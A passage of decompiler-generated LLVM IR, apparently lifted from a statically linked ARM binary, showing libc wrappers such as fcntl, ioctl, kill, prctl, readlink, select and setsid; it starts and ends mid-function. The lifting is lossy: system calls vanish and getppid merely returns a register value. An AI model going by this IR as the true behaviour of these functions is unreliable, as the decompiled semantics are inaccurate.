  uselistorder i32 %v1_1097c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1096c, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_10944, { 1, 0 }
  uselistorder i32 %v0_10954, { 1, 0, 2 }
  uselistorder i32 %v4_10938, { 1, 0 }
  uselistorder i32 %v1_10940, { 1, 2, 0 }
  uselistorder i32 %v4_1092c, { 1, 0 }
  uselistorder i32 %v1_10934, { 1, 2, 0 }
  uselistorder i32 %v4_10920, { 1, 0 }
  uselistorder i32 %v1_10928, { 1, 2, 0 }
  uselistorder i32 %v1_1094c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1091c, { 1, 0 }
  uselistorder i32 %v1_10948, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_10908, { 1, 0 }
  uselistorder i32 %v3_10904, { 1, 0 }
  uselistorder i32 %v1_10904, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_10908, { 1, 2, 0, 3 }
  uselistorder i32 %v4_108f4, { 1, 0 }
  uselistorder i32 %v4_108f0, { 2, 1, 0 }
  uselistorder i32 %v1_108f4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_108fc.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_108c8, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_108c8, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_108bc, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 65535, { 104, 0, 1, 9, 10, 2, 3, 23, 22, 26, 52, 25, 53, 11, 12, 4, 27, 54, 28, 55, 56, 13, 57, 24, 29, 58, 30, 59, 31, 60, 61, 62, 32, 63, 64, 14, 65, 5, 36, 66, 35, 67, 33, 68, 34, 69, 70, 15, 71, 6, 72, 73, 40, 74, 39, 75, 37, 76, 38, 77, 17, 16, 78, 79, 41, 80, 42, 81, 19, 18, 82, 83, 43, 84, 44, 85, 86, 87, 45, 88, 89, 90, 91, 20, 92, 93, 7, 46, 94, 47, 95, 48, 96, 97, 98, 21, 99, 100, 8, 51, 101, 49, 102, 50, 103 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_10954, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_10910, { 2, 0, 1 }
  uselistorder label %dec_label_pc_108fcthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_109bc = udiv i32 %arg1, %arg2
  ret i32 %v2_109bc
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_109d8 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_109d8
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_109f4 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_109f4, 2
  br i1 %tmp, label %dec_label_pc_10a30, label %dec_label_pc_10a0c

dec_label_pc_10a0c:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_10a64, label %dec_label_pc_10a20

dec_label_pc_10a20:                               ; preds = %dec_label_pc_10a0c
  %v0_10a24 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_10a58

dec_label_pc_10a30:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_10a4c, label %dec_label_pc_10a64

dec_label_pc_10a4c:                               ; preds = %dec_label_pc_10a30
  %v0_10a50 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_10a58

dec_label_pc_10a58:                               ; preds = %dec_label_pc_10a20, %dec_label_pc_10a4c
  %storemerge2 = phi i32 [ %v0_10a24, %dec_label_pc_10a20 ], [ %v0_10a50, %dec_label_pc_10a4c ]
  %storemerge.in = load i16, i16* @global_var_21a48.352, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_10a58 = load i32, i32* %r2.global-to-local, align 4
  %v1_10a58 = sub i32 0, %v0_10a58
  store i32 %v1_10a58, i32* %r2.global-to-local, align 4
  %v3_10a5c = add i32 %storemerge, %storemerge2
  %v4_10a5c = inttoptr i32 %v3_10a5c to i32*
  store i32 %v1_10a58, i32* %v4_10a5c, align 4
  br label %dec_label_pc_10a64

dec_label_pc_10a64:                               ; preds = %dec_label_pc_10a0c, %dec_label_pc_10a30, %dec_label_pc_10a58
  %storemerge1 = phi i32 [ -1, %dec_label_pc_10a58 ], [ %arg1, %dec_label_pc_10a30 ], [ %arg1, %dec_label_pc_10a0c ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_10a64, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10a58, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_10a7c = load i32, i32* @r2, align 4
  %v9_10a7c = load i32, i32* @r3, align 4
  store i32 %v9_10a7c, i32* %stack_var_-4, align 4
  %v3_10a80 = load i32, i32* @r4, align 4
  store i32 %v3_10a80, i32* %stack_var_-32, align 4
  %v6_10a80 = load i32, i32* @r5, align 4
  %v12_10a80 = load i32, i32* @r7, align 4
  %v4_10a90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 12800) to i32*), align 4
  %v2_10a98 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10a98, i32* @r3, align 4
  %v2_10a9c = icmp eq i32 %v4_10a90, 0
  %v0_10aa4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10aa4, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_10a7c, i32* @r4, align 4
  br i1 %v2_10a9c, label %dec_label_pc_10ac0, label %dec_label_pc_10ab4

dec_label_pc_10ab4:                               ; preds = %entry
  %v7_10ab4 = icmp eq i32 %arg2, 7
  br i1 %v7_10ab4, label %dec_label_pc_10b00, label %bb

bb:                                               ; preds = %dec_label_pc_10ab4
  %v8_10ab8 = icmp eq i32 %arg2, 14
  br i1 %v8_10ab8, label %dec_label_pc_10b00, label %dec_label_pc_10ac0

dec_label_pc_10ac0:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_10aa4, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_10aa4, -4095
  br i1 %tmp, label %dec_label_pc_10af8, label %dec_label_pc_10ae0

dec_label_pc_10ae0:                               ; preds = %dec_label_pc_10ac0
  %v0_10ae4 = call i32 @__aeabi_read_tp()
  %v3_10ae8 = load i16, i16* @global_var_21a48.352, align 2
  %v4_10ae8 = sext i16 %v3_10ae8 to i32
  store i32 %v4_10ae8, i32* @r3, align 4
  %v0_10aec = load i32, i32* @r2, align 4
  %v1_10aec = sub i32 0, %v0_10aec
  store i32 %v1_10aec, i32* @r2, align 4
  %v3_10af0 = add i32 %v4_10ae8, %v0_10ae4
  %v4_10af0 = inttoptr i32 %v3_10af0 to i32*
  store i32 %v1_10aec, i32* %v4_10af0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10af8

dec_label_pc_10af8:                               ; preds = %dec_label_pc_10ac0, %dec_label_pc_10ae0
  %v0_10af8 = phi i32 [ %v0_10aa4, %dec_label_pc_10ac0 ], [ -1, %dec_label_pc_10ae0 ]
  br label %dec_label_pc_10b4c

dec_label_pc_10b00:                               ; preds = %dec_label_pc_10ab4, %bb
  %v0_10b00 = call i32 @__libc_enable_asynccancel()
  %v0_10b04 = load i32, i32* @r7, align 4
  store i32 %v0_10b04, i32* @r1, align 4
  store i32 %v0_10b00, i32* %r6.global-to-local, align 4
  %v0_10b10 = load i32, i32* @r5, align 4
  store i32 %v0_10b10, i32* %r0.global-to-local, align 4
  store i32 %v0_10b10, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_10b10, -4095
  br i1 %tmp15, label %dec_label_pc_10b40, label %dec_label_pc_10b28

dec_label_pc_10b28:                               ; preds = %dec_label_pc_10b00
  %v1_10b2c = sub i32 0, %v0_10b10
  %v0_10b30 = call i32 @__aeabi_read_tp()
  store i32 %v0_10b30, i32* %r0.global-to-local, align 4
  %v3_10b34 = load i16, i16* @global_var_21a48.352, align 2
  %v4_10b34 = sext i16 %v3_10b34 to i32
  store i32 %v4_10b34, i32* @r3, align 4
  %v3_10b38 = add i32 %v4_10b34, %v0_10b30
  %v4_10b38 = inttoptr i32 %v3_10b38 to i32*
  store i32 %v1_10b2c, i32* %v4_10b38, align 4
  store i32 -1, i32* @r2, align 4
  %v0_10b40.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10b40

dec_label_pc_10b40:                               ; preds = %dec_label_pc_10b00, %dec_label_pc_10b28
  %v0_10b44 = phi i32 [ %v0_10b10, %dec_label_pc_10b00 ], [ -1, %dec_label_pc_10b28 ]
  %v0_10b40 = phi i32 [ %v0_10b00, %dec_label_pc_10b00 ], [ %v0_10b40.pre, %dec_label_pc_10b28 ]
  store i32 %v0_10b40, i32* %r0.global-to-local, align 4
  store i32 %v0_10b44, i32* @r7, align 4
  %v1_10b48 = call i32 @__libc_disable_asynccancel(i32 %v0_10b40)
  store i32 %v1_10b48, i32* %r0.global-to-local, align 4
  %v0_10b4c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10b4c

dec_label_pc_10b4c:                               ; preds = %dec_label_pc_10af8, %dec_label_pc_10b40
  %v0_10b4c = phi i32 [ %v0_10af8, %dec_label_pc_10af8 ], [ %v0_10b4c.pre, %dec_label_pc_10b40 ]
  store i32 %v0_10b4c, i32* %r0.global-to-local, align 4
  %v2_10b54 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_10b54, i32* @r4, align 4
  store i32 %v6_10a80, i32* @r5, align 4
  store i32 %v12_10a80, i32* @r7, align 4
  ret i32 %v0_10b4c

; uselistorder directives
  uselistorder i32 %v0_10b4c, { 1, 0 }
  uselistorder i32 %v0_10b40, { 1, 0 }
  uselistorder i32 %v0_10b10, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_10aa4, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_10b4c, { 1, 0 }
  uselistorder label %dec_label_pc_10b40, { 1, 0 }
  uselistorder label %dec_label_pc_10b00, { 1, 0 }
  uselistorder label %dec_label_pc_10af8, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_10b80 = load i32, i32* @r0, align 4
  ret i32 %v1_10b80
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_10b84 = load i32, i32* @r3, align 4
  store i32 %v9_10b84, i32* %stack_var_-4, align 4
  %v3_10b88 = load i32, i32* @r4, align 4
  store i32 %v3_10b88, i32* %stack_var_-32, align 4
  %v6_10b88 = load i32, i32* @r5, align 4
  %v12_10b88 = load i32, i32* @r7, align 4
  %v4_10b98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 12800) to i32*), align 4
  %v2_10ba0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10ba0, i32* @r3, align 4
  %v2_10ba4 = icmp eq i32 %v4_10b98, 0
  %v0_10bac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10bac, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_10ba4, label %dec_label_pc_10bbc, label %dec_label_pc_10bf4

dec_label_pc_10bbc:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_10bac, -4095
  br i1 %tmp, label %dec_label_pc_10bec, label %dec_label_pc_10bd4

dec_label_pc_10bd4:                               ; preds = %dec_label_pc_10bbc
  %v1_10bd8 = sub i32 0, %v0_10bac
  %v3_10bdc = load i16, i16* @global_var_21a48.352, align 2
  %v4_10bdc = sext i16 %v3_10bdc to i32
  store i32 %v4_10bdc, i32* @r3, align 4
  %v0_10be0 = call i32 @__aeabi_read_tp()
  %v2_10be4 = load i32, i32* @r3, align 4
  %v3_10be4 = add i32 %v2_10be4, %v0_10be0
  %v4_10be4 = inttoptr i32 %v3_10be4 to i32*
  store i32 %v1_10bd8, i32* %v4_10be4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10bec

dec_label_pc_10bec:                               ; preds = %dec_label_pc_10bbc, %dec_label_pc_10bd4
  %v0_10bec = phi i32 [ %v0_10bac, %dec_label_pc_10bbc ], [ -1, %dec_label_pc_10bd4 ]
  br label %dec_label_pc_10c40

dec_label_pc_10bf4:                               ; preds = %entry
  %v0_10bf4 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_10bf4, i32* %r6.global-to-local, align 4
  %v0_10c04 = load i32, i32* @r4, align 4
  store i32 %v0_10c04, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_10c04, -4095
  br i1 %tmp15, label %dec_label_pc_10c34, label %dec_label_pc_10c1c

dec_label_pc_10c1c:                               ; preds = %dec_label_pc_10bf4
  %v1_10c20 = sub i32 0, %v0_10c04
  %v3_10c24 = load i16, i16* @global_var_21a48.352, align 2
  %v4_10c24 = sext i16 %v3_10c24 to i32
  store i32 %v4_10c24, i32* @r3, align 4
  %v0_10c28 = call i32 @__aeabi_read_tp()
  store i32 %v0_10c28, i32* %r0.global-to-local, align 4
  %v2_10c2c = load i32, i32* @r3, align 4
  %v3_10c2c = add i32 %v2_10c2c, %v0_10c28
  %v4_10c2c = inttoptr i32 %v3_10c2c to i32*
  store i32 %v1_10c20, i32* %v4_10c2c, align 4
  %v0_10c34.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10c34

dec_label_pc_10c34:                               ; preds = %dec_label_pc_10bf4, %dec_label_pc_10c1c
  %v0_10c38 = phi i32 [ %v0_10c04, %dec_label_pc_10bf4 ], [ -1, %dec_label_pc_10c1c ]
  %v0_10c34 = phi i32 [ %v0_10bf4, %dec_label_pc_10bf4 ], [ %v0_10c34.pre, %dec_label_pc_10c1c ]
  store i32 %v0_10c34, i32* %r0.global-to-local, align 4
  store i32 %v0_10c38, i32* @r7, align 4
  %v1_10c3c = call i32 @__libc_disable_asynccancel(i32 %v0_10c34)
  store i32 %v1_10c3c, i32* %r0.global-to-local, align 4
  %v0_10c40.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10c40

dec_label_pc_10c40:                               ; preds = %dec_label_pc_10bec, %dec_label_pc_10c34
  %v0_10c40 = phi i32 [ %v0_10bec, %dec_label_pc_10bec ], [ %v0_10c40.pre, %dec_label_pc_10c34 ]
  store i32 %v0_10c40, i32* %r0.global-to-local, align 4
  %v2_10c48 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_10c48, i32* @r4, align 4
  store i32 %v6_10b88, i32* @r5, align 4
  store i32 %v12_10b88, i32* @r7, align 4
  ret i32 %v0_10c40

; uselistorder directives
  uselistorder i32 %v0_10c40, { 1, 0 }
  uselistorder i32 %v0_10c34, { 1, 0 }
  uselistorder i32 %v0_10c04, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10bac, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_10c40, { 1, 0 }
  uselistorder label %dec_label_pc_10c34, { 1, 0 }
  uselistorder label %dec_label_pc_10bec, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10c64 = load i32, i32* @r7, align 4
  store i32 %v3_10c64, i32* %stack_var_-8, align 4
  %v0_10c70 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10c70, -4095
  br i1 %tmp, label %dec_label_pc_10c90, label %dec_label_pc_10c78

dec_label_pc_10c78:                               ; preds = %entry
  %v1_10c7c = sub i32 0, %v0_10c70
  %v3_10c80 = load i16, i16* @global_var_21a48.352, align 2
  %v4_10c80 = sext i16 %v3_10c80 to i32
  %v0_10c84 = call i32 @__aeabi_read_tp()
  %v3_10c88 = add i32 %v4_10c80, %v0_10c84
  %v4_10c88 = inttoptr i32 %v3_10c88 to i32*
  store i32 %v1_10c7c, i32* %v4_10c88, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10c90.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10c90

dec_label_pc_10c90:                               ; preds = %entry, %dec_label_pc_10c78
  %v1_10c94 = phi i32 [ %v0_10c70, %entry ], [ -1, %dec_label_pc_10c78 ]
  %v2_10c90 = phi i32 [ %v3_10c64, %entry ], [ %v2_10c90.pre, %dec_label_pc_10c78 ]
  store i32 %v2_10c90, i32* @r7, align 4
  ret i32 %v1_10c94

; uselistorder directives
  uselistorder i32 %v0_10c70, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c90, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10c9c = load i32, i32* @r4, align 4
  store i32 %v3_10c9c, i32* %stack_var_-12, align 4
  %v0_10cac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10cac, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10cac, -4095
  br i1 %tmp, label %dec_label_pc_10cd4, label %dec_label_pc_10cbc

dec_label_pc_10cbc:                               ; preds = %entry
  %v0_10cc0 = call i32 @__aeabi_read_tp()
  %v3_10cc4 = load i16, i16* @global_var_21a48.352, align 2
  %v4_10cc4 = sext i16 %v3_10cc4 to i32
  %v0_10cc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_10cc8 = sub i32 0, %v0_10cc8
  store i32 %v1_10cc8, i32* %r2.global-to-local, align 4
  %v3_10ccc = add i32 %v4_10cc4, %v0_10cc0
  %v4_10ccc = inttoptr i32 %v3_10ccc to i32*
  store i32 %v1_10cc8, i32* %v4_10ccc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10cd4.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_10cd4

dec_label_pc_10cd4:                               ; preds = %entry, %dec_label_pc_10cbc
  %v1_10cd8 = phi i32 [ %v0_10cac, %entry ], [ -1, %dec_label_pc_10cbc ]
  %v2_10cd4 = phi i32 [ %v3_10c9c, %entry ], [ %v2_10cd4.pre, %dec_label_pc_10cbc ]
  store i32 %v2_10cd4, i32* @r4, align 4
  ret i32 %v1_10cd8

; uselistorder directives
  uselistorder i32 %v0_10cac, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10cd4, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10ce0 = load i32, i32* @r7, align 4
  store i32 %v3_10ce0, i32* %stack_var_-8, align 4
  %v0_10cec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10cec, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_10cec, -4095
  br i1 %tmp, label %dec_label_pc_10d14, label %dec_label_pc_10cfc

dec_label_pc_10cfc:                               ; preds = %entry
  %v0_10d00 = call i32 @__aeabi_read_tp()
  %v3_10d04 = load i16, i16* @global_var_21a48.352, align 2
  %v4_10d04 = sext i16 %v3_10d04 to i32
  store i32 %v4_10d04, i32* @r3, align 4
  %v0_10d08 = load i32, i32* @r2, align 4
  %v1_10d08 = sub i32 0, %v0_10d08
  store i32 %v1_10d08, i32* @r2, align 4
  %v3_10d0c = add i32 %v4_10d04, %v0_10d00
  %v4_10d0c = inttoptr i32 %v3_10d0c to i32*
  store i32 %v1_10d08, i32* %v4_10d0c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10d14.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10d14

dec_label_pc_10d14:                               ; preds = %entry, %dec_label_pc_10cfc
  %v1_10d18 = phi i32 [ %v0_10cec, %entry ], [ -1, %dec_label_pc_10cfc ]
  %v2_10d14 = phi i32 [ %v3_10ce0, %entry ], [ %v2_10d14.pre, %dec_label_pc_10cfc ]
  store i32 %v2_10d14, i32* @r7, align 4
  ret i32 %v1_10d18

; uselistorder directives
  uselistorder i32 %v0_10cec, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10d14, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10d20 = load i32, i32* @r4, align 4
  store i32 %v3_10d20, i32* %stack_var_-12, align 4
  %v0_10d30 = load i32, i32* @r0, align 4
  store i32 %v0_10d30, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10d30, -4095
  br i1 %tmp, label %dec_label_pc_10d58, label %dec_label_pc_10d40

dec_label_pc_10d40:                               ; preds = %entry
  %v0_10d44 = call i32 @__aeabi_read_tp()
  %v3_10d48 = load i16, i16* @global_var_21a48.352, align 2
  %v4_10d48 = sext i16 %v3_10d48 to i32
  %v0_10d4c = load i32, i32* %r2.global-to-local, align 4
  %v1_10d4c = sub i32 0, %v0_10d4c
  store i32 %v1_10d4c, i32* %r2.global-to-local, align 4
  %v3_10d50 = add i32 %v4_10d48, %v0_10d44
  %v4_10d50 = inttoptr i32 %v3_10d50 to i32*
  store i32 %v1_10d4c, i32* %v4_10d50, align 4
  %v2_10d58.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_10d58

dec_label_pc_10d58:                               ; preds = %entry, %dec_label_pc_10d40
  %v1_10d5c = phi i32 [ %v0_10d30, %entry ], [ -1, %dec_label_pc_10d40 ]
  %v2_10d58 = phi i32 [ %v3_10d20, %entry ], [ %v2_10d58.pre, %dec_label_pc_10d40 ]
  store i32 %v2_10d58, i32* @r4, align 4
  ret i32 %v1_10d5c

; uselistorder directives
  uselistorder i32 %v0_10d30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10d58, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_10d64 = load i32, i32* @r4, align 4
  store i32 %v3_10d64, i32* %stack_var_-28, align 4
  %v6_10d64 = load i32, i32* @r5, align 4
  %v9_10d64 = load i32, i32* @r6, align 4
  %v12_10d64 = load i32, i32* @r7, align 4
  %v15_10d64 = load i32, i32* @r8, align 4
  %v18_10d64 = load i32, i32* @sl, align 4
  %v21_10d64 = load i32, i32* @lr, align 4
  %v4_10d74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 12800) to i32*), align 4
  %v2_10d7c = icmp eq i32 %v4_10d74, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_10d7c, label %dec_label_pc_10d98, label %entry.dec_label_pc_10da4_crit_edge

entry.dec_label_pc_10da4_crit_edge:               ; preds = %entry
  br label %dec_label_pc_10da4

dec_label_pc_10d98:                               ; preds = %entry
  store i32 %v3_10d64, i32* @r4, align 4
  store i32 %v9_10d64, i32* @r6, align 4
  store i32 %v12_10d64, i32* @r7, align 4
  store i32 %v15_10d64, i32* @r8, align 4
  store i32 %v18_10d64, i32* %sl.global-to-local, align 4
  %v0_10da0 = call i32 @__syscall_select()
  br label %dec_label_pc_10da4

dec_label_pc_10da4:                               ; preds = %entry.dec_label_pc_10da4_crit_edge, %dec_label_pc_10d98
  %v0_10da4 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_10da4, i32* @r5, align 4
  %v0_10db8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_10db8, i32* @r0, align 4
  %v0_10dc0 = call i32 @__syscall_select()
  store i32 %v0_10dc0, i32* @r4, align 4
  %v0_10dc8 = load i32, i32* @r5, align 4
  %v1_10dcc = call i32 @__libc_disable_asynccancel(i32 %v0_10dc8)
  %v0_10dd0 = load i32, i32* @r4, align 4
  %v2_10dd8 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_10dd8, i32* @r4, align 4
  store i32 %v6_10d64, i32* @r5, align 4
  store i32 %v9_10d64, i32* @r6, align 4
  store i32 %v12_10d64, i32* @r7, align 4
  store i32 %v15_10d64, i32* @r8, align 4
  store i32 %v18_10d64, i32* @sl, align 4
  store i32 %v21_10d64, i32* @lr, align 4
  ret i32 %v0_10dd0

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10da4, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10de8 = load i32, i32* @r7, align 4
  store i32 %v3_10de8, i32* %stack_var_-8, align 4
  %v0_10df4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10df4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10df4, -4095
  br i1 %tmp, label %dec_label_pc_10e1c, label %dec_label_pc_10e04

dec_label_pc_10e04:                               ; preds = %entry
  %v0_10e08 = call i32 @__aeabi_read_tp()
  %v3_10e0c = load i16, i16* @global_var_21a48.352, align 2
  %v4_10e0c = sext i16 %v3_10e0c to i32
  %v0_10e10 = load i32, i32* %r2.global-to-local, align 4
  %v1_10e10 = sub i32 0, %v0_10e10
  store i32 %v1_10e10, i32* %r2.global-to-local, align 4
  %v3_10e14 = add i32 %v4_10e0c, %v0_10e08
  %v4_10e14 = inttoptr i32 %v3_10e14 to i32*
  store i32 %v1_10e10, i32* %v4_10e14, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10e1c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10e1c

dec_label_pc_10e1c:                               ; preds = %entry, %dec_label_pc_10e04
  %v1_10e20 = phi i32 [ %v0_10df4, %entry ], [ -1, %dec_label_pc_10e04 ]
  %v2_10e1c = phi i32 [ %v3_10de8, %entry ], [ %v2_10e1c.pre, %dec_label_pc_10e04 ]
  store i32 %v2_10e1c, i32* @r7, align 4
  ret i32 %v1_10e20

; uselistorder directives
  uselistorder i32 %v0_10df4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10e1c, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_10e2c = icmp eq i32* %arg2, null
  br i1 %v2_10e2c, label %dec_label_pc_10e70, label %dec_label_pc_10e40

dec_label_pc_10e40:                               ; preds = %entry
  %v2_10e40 = load i32, i32* %arg2, align 4
  %v1_10e44 = icmp slt i32 %v2_10e40, 0
  br i1 %v1_10e44, label %dec_label_pc_10e58, label %dec_label_pc_10e4c

dec_label_pc_10e4c:                               ; preds = %dec_label_pc_10e40
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
